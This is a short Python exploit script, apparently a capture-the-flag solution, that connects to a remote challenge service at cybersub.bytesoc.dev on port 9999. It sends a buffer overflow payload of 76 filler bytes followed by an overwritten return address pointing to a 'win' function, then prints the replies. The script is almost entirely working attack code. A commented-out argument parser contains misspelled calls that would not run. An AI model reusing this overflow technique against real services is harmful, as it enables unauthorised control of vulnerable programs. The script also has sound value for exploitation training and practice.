#!/usr/bin/env python3

import socket
# import argparse

'''
parser = argparse.ArguementParser()
parser.addargument(
        "host",
        type=str,
        help="The hostname or IP address to connect to",
        )
parser.addargument(
        "port",
        type=int,
        help="The port for the service to connect to",
        )
args = parser.parse_args()


'''

args = {'host' : 'cybersub.bytesoc.dev' , 'port' : 9999}

offset = 76
adrwin = b'\xa6\x91\x04\x08'

payload = b'v' *offset + adrwin + b"\n"



with socket.socket() as connection:
    connection.connect ((args['host'] , args['port']))
    print(connection.recv(4096).decode("utf-8"))
    connection.send(payload)
    print(connection.recv(4096).decode("utf-8"))
    print(connection.recv(4096).decode("utf-8"))



